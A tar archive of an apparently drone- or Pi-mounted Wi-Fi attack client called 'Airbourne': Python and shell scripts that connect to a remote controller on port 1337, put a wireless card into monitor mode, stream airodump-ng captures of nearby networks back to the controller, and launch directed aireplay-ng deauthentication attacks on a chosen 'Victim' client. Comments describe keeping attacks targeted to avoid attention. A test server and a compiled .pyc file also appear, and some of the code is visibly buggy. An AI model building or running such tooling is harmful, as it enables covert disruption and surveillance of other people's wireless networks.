airbourne.py                                                                                        0000644 0001750 0001750 00000000733 13021625427 011225  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/usr/bin/python

"""Airbourne_Client"""

import sys
import json
import socket
import threading
from threading import *
from socket import *

#eigene Module
from lib import *
from rfc import *


if __name__ == '__main__':
	
	if(len(sys.argv) < 2):
		sys.exit(0)
	#IP wird dann hart reinprogrammiert
 
	while True:
		connectToServer(sys.argv[1])#address of ssh-reverse proxy
		initConnection()

else:
	logHandler("INFO", "Something tried to import airbourne.py as module")


                                     airmon-ng.sh                                                                                        0000755 0001750 0001750 00000000664 13021625427 011116  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/bin/bash

start_wlan1() {
	if ifconfig wlxc4e9840d9cfa; then 
		airmon-ng start wlxc4e9840d9cfa 
		exit 0
	fi
}

stop_wlan1() {
	if airmon-ng stop wlxc4e9840d9cfa; then
		iw dev mon0 del
		exit 0
	else
		exit 1
	fi
}

if [ $# -eq 1 ]; then 
	if [ "$1" == "stop" ]; then 
		stop_wlan1 
		exit 0
	else
		exit 1
	fi
fi

if ! start_wlan1; then 
	if ifconfig wlxc4e9840d9cfa up; then 
		start_wlan1 
		exit 0
	else
		exit 1 
	fi
fi






                                                                            airodump-ng.sh                                                                                      0000755 0001750 0001750 00000000515 13021625427 011444  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/bin/bash

airodump_global() {
	if airodump-ng --write sendme --output-format csv mon0 2>&1
	then
		exit 0
	else
		exit 1
	fi
}

airodump_channel() {
	if airodump-ng -c $1 --write sendme --output-format csv mon0 2>&1 
	then
		exit 0
	else
		exit 1
	fi
}

if [ $# -eq 0 ]; then
	airodump_global
else
	airodump_channel $1
fi

		
	


                                                                                                                                                                                   deauth.sh                                                                                           0000755 0001750 0001750 00000000276 13021625427 010500  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/bin/bash

if [ $# -ne 3 ]; then
	exit 1
	
	else #anzahl Beacons, accessPoint-bssid, dann client-bssid
		if aireplay-ng -0 $1 -a $2 -c $3 mon0; then
			exit 0
		else
			exit 1
		fi
fi

		
                                                                                                                                                                                                                                                                                                                                  lib.py                                                                                              0000644 0001750 0001750 00000021726 13021626455 010014  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/usr/bin/python 

"""lib.py contains everthing which is not directly
related to sockets but hardly could be missed in 
airbourne.py

connectToServer()
initConnection()
lostConnection()
postOffice()
monitoreHandler()
dumpHandler()
sendData() just threaded
deauthHandler()
logHandler()
errorHandler()"""


import os
import sys
import json
import time
import socket
import logging
import threading
import subprocess

from threading import *
from rfc import *


##################################################################
# function connectToServer: parameters = ip-address of server    #
# set a connection to socket. in best case just called one times # 
##################################################################
def connectToServer(ip_address):
	
	global sock 
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	if sock == 0:
		logHandler("ERROR", "Could not create socket")
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
	print >>sys.stderr, 'connecting to %s' % ip_address
	try:
		sock.connect((ip_address, PORT))
	except socket.error:
		logHandler("ERROR", "Coud not connect on Socket")

	return

#################################################################
# Function initConnection										#
# starts to send hello messages and wait to receive responses. 	#
# A response is required to access the stage where other     	#
# packages are accepted and processed.
#################################################################
def initConnection():
	global lock 
	lock = Lock()

	sock.sendall(createHello()) 

	#receives messages after sending hello to GCS.
	while True:
		data = sock.recv(1024)
		if data == 0:
				logHandler("ERROR", "Connection lost while waiting for hello response")
				closeConnection()
				return #to airbourne.py in connecting-loop
		parsed_json = json.loads(data)
		print data
		#checks if it has received a response message. if not, than wait again
		if parsed_json['Type'] != RESP_MSG:
			logHandler("INFO", "Received undefined package in hello-stage")
			continue
		else:  
			while True:
					data = sock.recv(1024)
					print data
				#if data == SIGINT:
				#	logHandler("ERROR", "Connection lost while waiting for packets")
				#	closeConnection()
				#	sys.exit(0) #to airbourne.py in connectingloop
				#print data
				parsed_json = json.loads(data)
				postOffice(parsed_json)


		#if response leads to break out of the first while-loop it will listen for 
		#further packets. They will go to the postoffice function of lib.py.
		

##################################################################
# Function lostConnection close sockets and write to error-log	 #
# that connection is gone lost - which is never intended by this #
# server design, so it counts as error. 						 #
##################################################################
def closeConnection():
	socket.shutdown()
	socket.close()
	logHandler("INFO", "Closed sockets")
	return

#################################################################
# Function postOffice assig the read json-String to the proper	#	
# handler funtion by analysing the Type-Key.					#
#################################################################
def postOffice(parsed_json):

	if parsed_json['Type'] == MON_MSG:
		monitoreHandler(parsed_json)

	elif parsed_json['Type'] == DUMP_MSG:
		dumpHandler(parsed_json)

	elif parsed_json['Type'] == DEAUTH_MSG:
		deauthHandler(parsed_json)

	elif parsed_json['Type'] == OK_MSG:
		#if lib.py sends a dump-Packet it will lock till GCS sends an ok-packet
		#if this packet is received the lock will be released so lib.py can send further dump-packets. 
		lock.release()
	return


##################################################################
# Function monitoreHandler: parameters = resceived Json-String	 #
# By analysing the command-key of the json-String the airmon-ng  #
# script will be called to start or stop airmon.				 # 
# (Where no script paramter means "start airmon")                #
##################################################################
def monitoreHandler(parsed_json):
		
		if parsed_json['Command'] == STOP:
			cmd = ['./airmon-ng.sh', 'stop']
			p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
			for line in p.stdout:
   				jsonString = {
   							'airmon stop' : line,
   				}
   				#sock.sendall(json.dumps(jsonString) + '\0')
   				print jsonString
			p.wait()

		elif parsed_json['Command'] == START:
			cmd = ['./airmon-ng.sh']
			p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
			for line in p.stdout:
   				jsonString = {
   							'airmon start' : line,
   				}
   				sock.sendall(json.dumps(jsonString) + '\0')
   				print jsonString
			p.wait()
		
		return


#################################################################
# Function dumpHandler: paramters = resceived Json-String.  	#
# If Command-Key is "START" start thread of function sendData.	#
# If Command-Key is "STOP"  stop thread of funtion sendData. 	#
#################################################################
def dumpHandler(parsed_json):
	
	global dumpThread
	global pill2kill

	#just start sendData-thread if Command-Key ist "START" and there are no inctances running yet
	if parsed_json['Command'] == START and threading.active_count() == 0:
		pill2kill = threading.Event()
		dumpThread = threading.Thread(target=sendData, args=(pill2kill, parsed_json['Channel'],))
		dumpThread.start()
		return

	#just process the commands below if there is running 1 inctance of sendData-thread
	elif parsed_json['Command'] == STOP and threading.active_count() == 1:
		pill2kill.set()
   		dumpThread.join()
		return


###################################################################
# Function sendData: paramters = stopEvent and Channel.			  #
# start airodump by starting the specific script. the script will #
# create a csv-file which contains the output of airodump-ng.	  #
# Content of csv will be send line by line as data-typed 		  #
# json-String to GCS. Runs constantely as thread while GCS does   #
# send further packets. 										  #
###################################################################
def sendData(stop_event,channel):
	#check if file was already created in an old run 
	if os.path.exists('sendme-01.csv'):
		os.system('rm sendme-01.csv')

	#check if airodump should be started to list beacons of every channel
	if channel != 0:
		cmd = ['./airodump-ng.sh', str(channel)]

	#or rather of specific ones
	elif channel == 0:
		cmd = ['./airodump-ng.sh']
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
	
	#waiting for airodump to create the csv file
	while True:
		if os.path.exists('sendme-01.csv'):
			break

	#open csv in read-mode ans read line by line
	while True: 
		fd = open('sendme-01.csv', 'r')
		count = 0

		for line in fd:
			print "Count = " + str(count)
			if count == 0:
				count = count + 1
				continue

			#locked as long GCD send an ok which means last information received
			#will be set free in airbourne.py 
			lock.acquire() 
			#if first line is send as head-packet which GCD needs
			#to properly presenting the captured dump. 
			if count == 1:
				sock.sendall(createHead(line))     
			else:
		   		sock.sendall(createData(line))
		   	count = count + 1
		#set fd to the very first bit of the file so the whole file 
		#could be send again
		fd.seek(0)

		#wait 10 seconds for the kill event which will be triggerd by
		#send airodump-stop package sent by the GCS. Besided it will block
		#for 10 seconds to prevent sending redundant data of airodump.
		if stop_event.wait(10):
				return


####################################################################
# Function deauthHandler: paramters = received json-String.	       #
# This functions requires 3 key-values to execute: 				   #
# AP-BSSID, victim client-BSSID, amount of deauth-beacons 		   #
# For now we just want to spell directed deauth-attacks so we      #
# possibly avoid to much attention at nw-domains. As well infinity #
# loop for deauth-beacons is not possible.
####################################################################
def deauthHandler(parsed_json):
	
	cmd = ["./deauth.sh", str(parsed_json['Count']), str(parsed_json['Ap']), str(parsed_json['Victim'])]
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
	countDown = 0

	for line in p.stdout:
		jsonString = {
				'deauth count' : int(parsed_json['Count'])-countDown,
		}	
		countDown = countDown+1
		print jsonString
		#sock.sendall(json.dumps(jsonString) + '\0')
	return
	

###################################################################
# Funtion logHandler: paramters = level of log and message		  #
# writes certain events to logfile airbourne.log				  #
###################################################################
def logHandler(log_type, log_message):
	logging.basicConfig(format = '%(asctime)s %(levelname)s:%(message)s', 
			datefmt='%m/%d/%Y-%I:%M:%p', filename="airbourne.log", level=logging.INFO)
	if log_type == "INFO":
		logging.info(log_message)
	elif log_type == "WARNING":
		logging.warning(log_message)
	elif log_type == "ERROR":
		logging.error(log_message)
	return


def errorHandler(jsonString, message):
	print "toDo: errorHandler"
                                          rfc.py                                                                                              0000644 0001750 0001750 00000003453 13021625427 010013  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/usr/bin/python

"""anything related to sockets and packets"""

import json
import netifaces
import sys
import threading
import socket

from netifaces import AF_INET
from threading import *

OK_MSG = 0
HELLO_MSG = 1
RESP_MSG = 2
MON_MSG = 3
DUMP_MSG = 4
HEAD_MSG = 5
DATA_MSG = 6
SHELL_MSG = 7
DEAUTH_MSG = 8
SNIFF_MSG = 9
ERROR_MSG = 255

START = "start"
STOP = "stop"
PORT = 1337


##############################
# Almost nothing to see here.#
##############################
def createHello():
	jsonString = { 
				'Type': HELLO_MSG,
	 			'SourceAddress' : netifaces.ifaddresses('enp4s0')[AF_INET][0]['addr'], #iface of PI
	} 
	return json.dumps(jsonString)#+'\0'

def createData(line):
	jsonString = {
		   		'Type' : DATA_MSG,
		   		'Data' : line,
	}
	return json.dumps(jsonString)#+'\0'

def createHead(line):
	jsonString = {
				'Type' : HEAD_MSG,
			   	'Data' : line,
	}
	return json.dumps(jsonString)#+'\0'



############################################################################
# Just used by server. Exists because of completeness and testing purposes.#
############################################################################
def createOK():
	jsonString = {
				'Type' : OK_MSG,
	}

def createResponse():
	jsonString = {
				'Type' : RESP_MSG,
				'SourceAddress' : '122.122.122.122',
	}
	return json.dumps(jsonString)#+'\0'

def createMonitore(command):
	jsonString = {
				'Type' : MON_MSG,
				'Command' : command,
	}
	return json.dumps(jsonString)#+'\0'

def createDump(command, channel):	
	jsonString = {
				'Type' : DUMP_MSG,
				'Command' : command,
				'Channel' : channel,
	}
	return json.dumps(jsonString)#+'\0'

def createDeauth(ap, victim, count):
	jsonString = {
				'Type' : DEAUTH_MSG,
				'Ap' : ap,
				'Victim' : victim,
				'Count' : count,
				
	}
	return json.dumps(jsonString)#+'\0'


                                                                                                                                                                                                                     rfc.pyc                                                                                             0000644 0001750 0001750 00000004535 13021625637 010163  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     ó
+GXc           @   sü   d  Z  d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l Td Z d Z d Z	 d Z
 d	 Z d
 Z d Z d Z d Z d Z d Z d Z d Z d Z d   Z d   Z d   Z d   Z d   Z d   Z d   Z d   Z d S(   s'   anything related to sockets and packetsi˙˙˙˙N(   t   AF_INET(   t   *i    i   i   i   i   i   i   i   i   i	   i˙   t   startt   stopi9  c          C   s6   i t  d 6t j d  t d d d 6}  t j |   S(   Nt   Typet   enp4s0i    t   addrt   SourceAddress(   t	   HELLO_MSGt	   netifacest   ifaddressesR    t   jsont   dumps(   t
   jsonString(    (    s   /home/pi/rfc.pyt   createHello"   s    c         C   s!   i t  d 6|  d 6} t j |  S(   NR   t   Data(   t   DATA_MSGR   R   (   t   lineR   (    (    s   /home/pi/rfc.pyt
   createData)   s    
c         C   s!   i t  d 6|  d 6} t j |  S(   NR   R   (   t   HEAD_MSGR   R   (   R   R   (    (    s   /home/pi/rfc.pyt
   createHead0   s    
c          C   s   i t  d 6}  d  S(   NR   (   t   OK_MSG(   R   (    (    s   /home/pi/rfc.pyt   createOK<   s    c          C   s!   i t  d 6d d 6}  t j |   S(   NR   s   122.122.122.122R   (   t   RESP_MSGR   R   (   R   (    (    s   /home/pi/rfc.pyt   createResponseA   s    
c         C   s!   i t  d 6|  d 6} t j |  S(   NR   t   Command(   t   MON_MSGR   R   (   t   commandR   (    (    s   /home/pi/rfc.pyt   createMonitoreH   s    
c         C   s(   i t  d 6|  d 6| d 6} t j |  S(   NR   R   t   Channel(   t   DUMP_MSGR   R   (   R   t   channelR   (    (    s   /home/pi/rfc.pyt
   createDumpO   s
    
c         C   s/   i t  d 6|  d 6| d 6| d 6} t j |  S(   NR   t   Apt   Victimt   Count(   t
   DEAUTH_MSGR   R   (   t   apt   victimt   countR   (    (    s   /home/pi/rfc.pyt   createDeauthW   s    
(   t   __doc__R   R	   t   syst	   threadingt   socketR    R   R   R   R   R   R   R   t	   SHELL_MSGR$   t	   SNIFF_MSGt	   ERROR_MSGt   STARTt   STOPt   PORTR   R   R   R   R   R   R    R(   (    (    (    s   /home/pi/rfc.pyt   <module>   s:   
							                                                                                                                                                                   testserver.py                                                                                       0000644 0001750 0001750 00000002301 13021625623 011434  0                                                                                                    ustar   pi                              pi                                                                                                                                                                                                                     #!/usr/bin/python

"""test server um Packete anzu nehmen"""
import socket
import sys
import json
import time

from rfc import *

def connect():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('', 1337))
	sock.listen(1)
	connection, client_address = sock.accept()
	return connection

connection = connect()

while True:

	#time.sleep(30)

	data = connection.recv(1024)
	jsonString = createResponse()
	connection.sendall(jsonString)
	time.sleep(3)

	#jsonString = createMonitore("start")
	#connection.sendall(jsonString)
	
	#time.sleep(3)

	#jsonString = createDump("start", 0)
	#connection.sendall(jsonString)
	#time.sleep(12)

	#jsonString = createDump("stop", 0)
	#connection.sendall(jsonString)
	#time.sleep(3)

	#jsonString = createDump("start" , 6)
	#connection.sendall(jsonString)

	time.sleep(110)

	#jsonString = createDeauth("C4:27:95:77:05:D3","78:F8:82:ED:A7:71",21)
	#connection.sendall(jsonString)

	#time.sleep(20)

	#jsonString = createDump("stop", 0)
	#connection.sendall(jsonString)

	time.sleep(3)


	#jsonString = createMonitore("stop")
	#connection.sendall(jsonString)
	#time.sleep(3)

	


connection.close()







                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               